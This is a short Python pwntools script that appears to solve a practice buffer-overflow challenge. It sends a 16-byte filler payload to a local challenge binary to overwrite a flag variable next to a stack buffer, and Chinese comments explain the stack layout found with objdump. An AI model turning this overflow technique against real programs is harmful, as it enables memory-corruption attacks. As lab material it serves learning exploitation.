from pwn import *
# set 
context(arch="amd64", os="linux", log_level="debug")
# excute
challenge_path = "/challenge/buffer-overflow-level2.0"
p = process(challenge_path)

# create string
shellcode=p64(0x11111111)+p32(0x111)+p16(0x11)+p8(0x11)+p8(0x01)
p.sendlineafter("3 + 5 = ?\n",shellcode)

# 接收题目的输出
result = p.recvall()

# 打印题目的输出
print(result)
'''
读源码 objdump -d反汇编看main
由于地址对齐，栈中顺序是1字节bool+空3字节+4字节int+8*1字节buf
所以要构造128位的payload
'''